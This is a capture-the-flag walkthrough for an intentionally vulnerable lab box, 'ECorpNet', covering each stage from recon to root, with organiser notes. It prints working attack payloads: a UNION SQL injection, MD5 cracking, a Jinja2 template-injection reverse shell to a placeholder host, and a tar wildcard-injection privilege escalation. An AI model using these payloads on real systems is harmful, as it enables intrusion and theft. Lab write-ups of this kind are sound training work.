# ECorpNet: Breach & Climb — walkthrough

> **SPOILER.** Full intended path from recon to root. `box/provision.sh` never copies
> it onto the box. Automated solvers: [`solve/`](solve/). Russian step-by-step
> writeup with expected outputs: [`docs/writeup-ru.md`](docs/writeup-ru.md).

Box built by `sudo ./box/provision.sh` (Debian 13). Flags are random per box:
`/root/.ctf-flags` on the server.

| Stage | From → To | Technique | Flag |
|---|---|---|---|
| 0 | — | Recon: ports, web content, API discovery | — |
| 1 | anonymous → contractor | Self-registration | — |
| 2 | contractor → admin (web) | UNION SQLi in `/api/v1/employees` → unsalted MD5 → rockyou | — |
| 3 | admin → `ecorpnet` shell | SSTI in admin email-template preview | — |
| 4 | `ecorpnet` → `pnair` | Cleartext creds in `/etc/ecorpnet/backup.conf`, password reuse | `user.txt` |
| 5 | `pnair` → root | `sudo` script runs `tar … *` in a pnair-writable dir (wildcard injection) | `root.txt` |

```bash
export T=192.168.50.116      # box
export B=http://$T
```

---

## 0. Recon  ✅ verified

```bash
nmap -sC -sV -p- --min-rate 2000 -T4 $T
```
```
22/tcp open  ssh   OpenSSH 10.0p2 Debian 7+deb13u4
80/tcp open  http  nginx
|_http-title: Did not follow redirect to /login?next=/
```

Web content:
```bash
ffuf -s -u $B/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200,301,302,308,401,403
# admin directory documents login profile register reports tickets

ffuf -s -u $B/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -mc 200,301,302,308,401,403
# api/v1/me        <- 401: an authenticated JSON API exists
```

`/register` is open: E Corp lets external contractors self-register.

## 1. Foothold in the portal — contractor account  ✅ verified

```bash
csrf() { curl -s "$@" | grep -oP 'csrf_token" value="\K[^"]+' | head -1; }

T1=$(csrf -c jar.txt $B/register)
curl -s -b jar.txt -c jar.txt -X POST $B/register \
  --data-urlencode username=mallory --data-urlencode "full_name=Mallory Riot" \
  --data-urlencode company=Allsafe  --data-urlencode email=mallory@allsafe.example \
  --data-urlencode 'password=Passw0rd!' --data-urlencode 'confirm=Passw0rd!' \
  --data-urlencode csrf_token=$T1                       # 302 -> /login

T1=$(csrf -c jar.txt $B/login)
curl -s -b jar.txt -c jar.txt -X POST $B/login \
  --data-urlencode username=mallory --data-urlencode 'password=Passw0rd!' \
  --data-urlencode csrf_token=$T1                       # 302 -> /

curl -s -b jar.txt $B/api/v1/
# {"endpoints":["/api/v1/me","/api/v1/employees","/api/v1/employees/<id>",...]}
```

## 2. SQL injection → admin password  ✅ verified

The web UI's directory search is safe; the API's `?q=` is not.

```bash
curl -s -b jar.txt -G $B/api/v1/employees --data-urlencode "q='"
# 500 Internal Server Error   <- broken SQL
```

The query is `... WHERE is_active = 1 AND (full_name LIKE '%<q>%' OR ...)` and
returns 9 columns (`id, username, full_name, email, title, department, phone,
office, manager_id` — visible in any normal API response). SQLite.

```bash
curl -s -b jar.txt -G $B/api/v1/employees --data-urlencode \
 "q=') AND 0 UNION ALL SELECT id,username,password_hash,email,role,department,phone,office,manager_id FROM users--" \
 | python3 -c 'import sys,json; [print(r["username"]+":"+r["full_name"]+"  ("+r["title"]+")") for r in json.load(sys.stdin)]'
```
```
pprice:0691df26da82d6eb2e5da8924628db63  (admin)
tcolby:034a1fd13b5abe6cc8bb1354e4e95040  (manager)
...
```

32 hex chars, no salt → raw MD5:
```bash
# output of the previous command, without the "(role)" part
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show --format=raw-md5 hashes.txt
# pprice:bowwow        (rockyou line 300; the other 14 hashes do not crack — by design)
```

Sign in as **pprice / bowwow** → Administrator (Phillip Price, CEO).
Note: online brute force is not an option — 10 failures per IP+user / 10 min lockout.

## 3. Admin → shell as `ecorpnet`  ✅ verified

**Where:** Admin → Email templates (`/admin/comms/<id>`) → **Preview** button.

**Bug:** `ecorpnet/comms.py` renders the preview with Flask's
`render_template_string` (not sandboxed) on the attacker-controlled body and
subject → Jinja2 SSTI → Python → OS commands.

**Steps:**
1. Confirm SSTI with a harmless arithmetic expression in the body — the preview shows the evaluated result.
2. Escalate to command execution and a reverse shell (`nc -lvnp 4444` on your side), payload in the **Body** field, then **Send test preview**:
   ```
   {{ lipsum.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" </dev/null >/dev/null 2>&1 &').read() }}
   ```
   The redirects and the trailing `&` matter: without them the HTTP request hangs while the shell lives.
3. Upgrade to a PTY (needed for `su` in the next stage):
   `python3 -c 'import pty; pty.spawn("/bin/bash")'`, Ctrl+Z, `stty raw -echo; fg`, `export TERM=xterm`.

**Expect:** `id` → `uid=…(ecorpnet) gid=…(ecorpnet)`, cwd `/opt/ecorpnet/app`.
The app code is read-only for you (root-owned + systemd `ReadOnlyPaths`), so you can't wreck it for other players.

**Checks for the organiser:**
- `su`/`sudo` must work from this shell (the unit no longer has `NoNewPrivileges=yes`).
- `ls /home` must list `pnair` (`ProtectHome=read-only`, not `yes`).

## 4. `ecorpnet` → `pnair` (user flag)  ✅ verified

**Enumeration** (manual or linPEAS — "interesting files / passwords in config"):
```bash
id; ls -la /home
find / -xdev -group ecorpnet -not -path '/opt/*' 2>/dev/null   # -> /etc/ecorpnet/backup.conf
ls -la /etc/ecorpnet/                # root:ecorpnet 640 — readable by our group
cat /etc/ecorpnet/backup.conf        # BACKUP_USER=pnair  BACKUP_PASS=SteelMountain-Backup#2015
```

`backup.conf` belongs to Priya Nair (IT Operations) and contains `BACKUP_USER` /
`BACKUP_PASS` with a "this is my login for now" TODO → password reuse.

```bash
su pnair            # needs the PTY from stage 3
# or, simpler and more stable:
ssh pnair@$T
cat ~/user.txt      # flag{...}
```

## 5. `pnair` → root (root flag)  ✅ verified

```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/steelmountain-backup
cat /usr/local/bin/steelmountain-backup
ls -ld /srv/reports       # owned by pnair
```

**Bug:** the script runs as root, `cd /srv/reports` and then `tar czf … *`.
The shell expands `*` into file names *before* tar runs, so a file whose name
looks like a tar option is parsed as an option. pnair can create files in
`/srv/reports` → controls tar's arguments as root.

**Technique:** GTFOBins → `tar` → *Sudo* / *Shell* (the `--checkpoint` /
`--checkpoint-action` options), delivered through file names in `/srv/reports`
(classic "tar wildcard injection").

```bash
cd /srv/reports
printf '#!/bin/sh\ncp /bin/bash /var/tmp/rb\nchmod 4755 /var/tmp/rb\n' > x.sh
touch ./--checkpoint=1
touch './--checkpoint-action=exec=sh x.sh'
sudo /usr/local/bin/steelmountain-backup
/var/tmp/rb -p
id                    # euid=0(root)
cat /root/root.txt    # flag{...}
```

Use `/var/tmp`, not `/tmp`: on Debian 13 `/tmp` is a `nosuid` tmpfs, so a SUID bash there gives you nothing.

Notes for players who come from the web shell: root obtained inside
`ecorpnet.service` is still in its sandbox (`/usr`, `/etc`, `/root` read-only,
`PermitRootLogin no`) — enough to read the flag, not to persist.

---

## Organiser notes

- Reset between rounds: `sudo ctf-reset` (kills player shells, reseeds DB, restores `/srv/reports`, `/home/pnair`, flags).
- Full rollback (after anyone got root): `sudo ctf-snapshot` once when the box is final (and after every intentional change, e.g. a password change), then `sudo ctf-restore` — deletes everything created since the snapshot in `/etc /root /home /srv /usr/local /opt/ecorpnet`, restores files/modes, removes new SUID binaries, then runs `ctf-reset`.
- Rotate flags: `sudo rm /root/.ctf-flags && sudo ./box/provision.sh`.
- Before players connect: no other account (e.g. the admin's own) may have a weak password — anyone in the `sudo` group with a guessable password = free root over SSH. Remove `~/ctf-src` from the box.

- The app trusts one proxy hop (`ProxyFix(x_for=1)`) so per-IP rate limits (5 sign-ups/hour, 30 failed logins/10 min) apply per player, not to everyone behind nginx at once. During the first live run this was missing and the whole room shared one bucket; hot fix on a running box: raise `MAX_*` in `/opt/ecorpnet/app/ecorpnet/auth.py`, then `sudo systemctl kill -s HUP ecorpnet` (keeps player shells).
- One admin account for everyone: tell players not to change `pprice`'s password. To restore it: `sudo sqlite3 /opt/ecorpnet/app/instance/ecorpnet.db "UPDATE users SET password_hash='0691df26da82d6eb2e5da8924628db63', is_active=1 WHERE username='pprice'; DELETE FROM login_attempts;"`

### Unintended-path checklist (verified on 2026-11-11)
- Only `pprice` is in rockyou; other web users' hashes do not crack.
- No SUID outside the Debian defaults; no root cron jobs.
- CUPS (631) listens on localhost only.
